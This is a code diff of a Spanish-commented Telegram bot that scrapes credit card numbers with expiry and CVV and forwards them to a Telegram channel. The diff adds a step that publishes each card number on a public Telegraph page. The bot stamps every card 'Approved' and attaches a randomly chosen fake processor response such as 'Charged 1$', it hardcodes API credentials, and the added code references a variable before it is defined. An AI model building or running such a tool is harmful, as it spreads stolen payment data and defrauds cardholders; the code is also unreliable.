@@ -8,10 +8,11 @@ import random
 from telethon import Button
 import requests
 from time import sleep
+from telegraph import Telegraph
 
 API_ID =  28142643 #tu api id bb
 API_HASH = '8d2286aaa9e2006c9268218afcdcc89e'  #tu api hash bb
-SEND_CHAT = -1001875996081 #chat o canal donde quieres que se envien las ccs
+SEND_CHAT = -1001850450912 #chat o canal donde quieres que se envien las ccs
 
 client = TelegramClient('session', API_ID, API_HASH)
 
@@ -156,12 +157,18 @@ async def new_order(event):
 
                 r1 = ["Approved", "Subscription complete", "Charged 1$", "Your card's security code is incorrect", "CVV Approved", "CVC Declined", "CCN CARD", "CCN CARD / 2010 Card Issuer Declined CVV", "Error: Your card has insufficient funds.", "Approved CCN", "CVV2 FAILURE POSSIBLE CVV ⌯ N - AVS: G", "𝑪𝒉𝒂𝒓𝒈𝒆𝒅 𝟎.𝟐𝟓$", "𝑪𝒉𝒂𝒓𝒈𝒆𝒅 $3"]
                 r2 = random.choice(r1)
+                telegraph = Telegraph()
+                titulo = "Título del post"
+                contenido = "Contenido del post"
+                plantill4 = f"<h1>{titulo}</h1><p>{contenido} {cc_number}</p>" # Crea el
+                response = telegraph.create_page( title=titulo, content=plantilla, author_name="Nombre del autor", author_url="https://example.com/autor", return_content=True )
+                link = response["url"]
                 fullinfo = f"{cc_number}|{mes}|{ano}|{cvv}"
                 plantilla = f"""
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
           点 𝙸𝚋𝚊𝚒 𝚂𝚌𝚛𝚊𝚙𝚙𝚎𝚛 点
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-Card ➪ `{cc_number}|{mes}|{ano}|{cvv}`
+Card ➪ `{link}`
 Status ➪ `Approved ✅`
 Response ➪ `{r2}`
 — — — — — — — — — — — — — — —
